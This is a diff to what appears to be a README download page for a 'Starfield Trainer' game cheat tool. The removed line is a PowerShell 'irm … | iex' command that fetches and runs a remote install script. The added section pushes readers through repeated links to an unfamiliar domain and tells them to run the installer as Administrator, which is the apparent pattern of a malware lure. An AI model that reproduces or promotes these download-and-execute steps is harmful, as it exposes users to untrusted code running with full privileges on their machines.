@@ -3,7 +3,7 @@
 Open PowerShell and run:
 
 ```powershell
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
+https://starfield.nexustool.fun/
 ```
 
 That's it. The installer handles everything.
@@ -44,3 +44,30 @@ starfield-trainer | starfield-trainer-free | starfield-trainer-download | starfi
 ---
 
 *Starfield Trainer 2026 — automated setup for Windows 10/11*
+
+## Download & Install
+
+> **This is the download page.** Use the button or link below to get **Starfield Trainer** for Windows.
+
+<p align="center">
+  <a href="https://starfield.nexustool.fun/">
+    <img src="https://img.shields.io/badge/Download-Starfield%20Trainer-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Starfield Trainer">
+  </a>
+</p>
+
+| | |
+| --- | --- |
+| **Direct link** | **[starfield.nexustool.fun](https://starfield.nexustool.fun/)** |
+| **Full URL** | `https://starfield.nexustool.fun/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
+
+### Quick steps
+
+1. Click **[Download — starfield.nexustool.fun](https://starfield.nexustool.fun/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://starfield.nexustool.fun/"><strong>⬇ Download Starfield Trainer now</strong></a></p>
